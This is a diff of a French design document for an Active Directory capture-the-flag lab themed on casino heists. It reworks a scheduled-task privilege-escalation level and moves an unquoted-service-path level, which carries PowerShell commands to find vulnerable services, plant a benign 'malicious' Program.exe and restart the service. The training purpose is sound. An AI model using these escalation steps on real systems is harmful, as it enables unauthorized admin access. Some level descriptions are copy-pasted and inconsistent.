@@ -313,44 +313,17 @@ Flag (à soumettre) username + password du compte sous ce format username:passwo
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level XXXXX (AD Mgm Grand) : Escalade de privilèges vi un chemin sans quotes
+Level 5 (AD Mgm Grand) : Escalade de privilèges via une tache planifié
 
 Script pour histoire du niveau :
 
-Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.
+Après avoir consolidé votre accès sur dans le casino Bellagio et pris le contrôle du serveur de sauvegarde, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Une source à vous révèle qu’un script PowerShell s’exécute toutes les heures avec des droits élevés sur une machine membre du domaine MGM.
 
-Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....
+Votre objectif est simple : modifier le contenu du fichier de script planifié de façon à créer un compte avec assez au niveau de privilège au prochain passage de la tâche.
 
-
-Attaque Unquoted Service Path : 
+Attaque :
 
 L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
-
-
-
-Commandes :
-
-Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
-=> Liste les services sans quote.
-
-icacls "C:\Chemin\Vers\Le\Dossier"
-=> Verifie les permission
-
-# Créer un script malveillant
-$maliciousScript = @'
-$path = "$env:USERPROFILE\Desktop\exploit.txt"
-New-Item -ItemType File -Path $path -Force
-Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
-'@
-
-Set-Content -Path "C:\Program.exe" -Value $maliciousScript
-
-# Copier le script malveillant dans le répertoire cible
-Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"
-
-# Redémarrer le service vulnérable
-Restart-Service -Name "VulnerableService"
-
 
 Exemple de script : 
 ```powershell
@@ -497,7 +470,43 @@ Level 9 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferenc
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 10:
+Level 10 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes
+
+Script pour histoire du niveau :
+
+Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.
+
+Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....
+
+
+Attaque Unquoted Service Path : 
+
+L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
+
+
+
+Commandes :
+
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
+=> Liste les services sans quote.
+
+icacls "C:\Chemin\Vers\Le\Dossier"
+=> Verifie les permission
+
+# Créer un script malveillant
+$maliciousScript = @'
+$path = "$env:USERPROFILE\Desktop\exploit.txt"
+New-Item -ItemType File -Path $path -Force
+Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
+'@
+
+Set-Content -Path "C:\Program.exe" -Value $maliciousScript
+
+# Copier le script malveillant dans le répertoire cible
+Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"
+
+# Redémarrer le service vulnérable
+Restart-Service -Name "VulnerableService"
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
